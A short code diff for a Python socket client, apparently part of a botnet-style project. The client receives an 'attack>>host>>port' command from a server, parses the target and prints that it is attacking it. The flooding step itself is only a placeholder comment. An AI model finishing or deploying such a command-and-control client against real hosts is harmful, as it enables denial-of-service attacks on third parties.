@@ -23,8 +23,13 @@ address=socket.getaddrinfo(host,port)
 client.connect(address)
 
 
-
-if client.recv(2**10):
+attack=(client.recv(2**10)).decode()
+#Attck consists of : "attack>>"  +  attckHost  +  ">>"  +  attackPort
+if attack:
+    attackHost=attack.partition(">>")[2].partition(">>")[0]
+    attackPort=attack.partition(">>")[2].partition(">>")[2]
+    print(str(socket.gethostname())+" is attacking "+str(attackHost)+ " through port "+str(attackPort))
+    
     pass
     #Here should be the pinging application
 
